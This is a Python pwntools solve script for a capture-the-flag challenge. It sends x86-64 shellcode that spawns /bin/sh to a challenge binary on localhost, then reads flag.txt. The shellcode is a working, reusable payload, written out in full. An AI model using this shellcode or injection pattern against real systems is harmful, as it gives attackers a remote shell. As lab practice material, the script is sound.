#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 5003)

    return r


def main():
    r = conn()

    shellcode = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05";

    print(f"Sending shellcode:\n{shellcode}")

    r.sendlineafter(b"Enter the code you want to execute:", shellcode)

    pause()

    r.sendline(b"cat flag.txt")    
    r.recvuntil(b"ghctf")
    flag = r.clean().decode()

    log.success(f"Flag : {"ghctf" + flag}")

    r.close()


if __name__ == "__main__":
    main()
